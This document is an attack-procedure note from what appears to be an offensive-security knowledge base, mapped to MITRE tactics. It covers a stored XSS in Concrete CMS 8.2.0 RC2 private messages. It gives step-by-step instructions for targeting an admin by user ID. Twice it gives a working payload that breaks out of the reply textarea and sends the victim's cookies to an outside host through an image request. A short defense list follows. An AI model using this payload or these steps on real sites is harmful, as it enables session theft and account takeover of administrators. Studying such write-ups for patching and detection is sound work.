---
tags:
  - xss
  - concrete-cms
  - authentication
type: procedure
tools:
  - '[[tools/Chrome]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.691Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 3b2dd0c3-ea0d-4956-a9e2-865b7f136459
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Authenticate-and-Craft-Malicious-Private-Message

## Summary

This procedure authenticates an attacker to a Concrete CMS instance and crafts a private message containing a stored XSS payload designed to execute when the recipient replies, targeting the unsanitized quoting in the reply form.

## Description

In Concrete CMS 8.2.0 RC2, the Private Messages feature allows users to send messages. The vulnerability arises because original message content is quoted into the reply textarea without HTML escaping. The attacker logs in with any user account, navigates to the message composition page for a target (e.g., admin ID=1), and appends a payload like `</textarea><script>var i = document.createElement('img'); i.src ='https://bl4de.000webhostapp.com/?c='+ document.cookie; document.body.append(i);</script>`. This closes the textarea on reply and injects executable JS to exfiltrate cookies via an image src request. Prerequisites include valid credentials and knowledge of the target's user ID.

## Requirements

1. Valid Concrete CMS user credentials (non-admin sufficient)
2. Access to the CMS web interface (e.g., via browser)
3. Target user ID (discoverable via URL manipulation or enumeration)
4. Hosted receiver endpoint for exfiltration (e.g., on 000webhost)

## Defense

Defensive measures and detection strategies:

- Enable strict XSS sanitization for all user inputs, including quoted content in forms
- Use Content Security Policy (CSP) to restrict script execution and external resource loads
- Monitor for anomalous network requests from the CMS domain to external hosts
- Audit private message handling for escaping issues

## Objectives

1. Gain authenticated access to send private messages
2. Inject a payload that remains dormant until reply
3. Set up conditions for JS execution in victim context

## Instructions

### Step 1: Authenticate to Concrete CMS

**Context**: Log in as the attacker user to access messaging features.

Use a browser like [[tools/Chrome]] to navigate to the CMS login and authenticate.

**Expected Output**: Dashboard access granted; user session established.

### Step 2: Navigate to Message Composition

**Context**: Target the desired recipient by modifying the write URL.

Navigate to `index.php/account/messages`, then change to `index.php/account/messages/write/1` (replace 1 with target user ID).

**Expected Output**: Private message composition form loads for the target.

### Step 3: Insert Malicious Payload

**Context**: Compose the message with the XSS payload in the content field.

Set a benign title, then append to content: `</textarea><script>var i = document.createElement('img'); i.src ='https://bl4de.000webhostapp.com/?c='+ document.cookie; document.body.append(i);</script>`.

**Expected Output**: Payload visible in the editor; no execution yet.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]

## Tags

- xss
- concrete-cms
- authentication
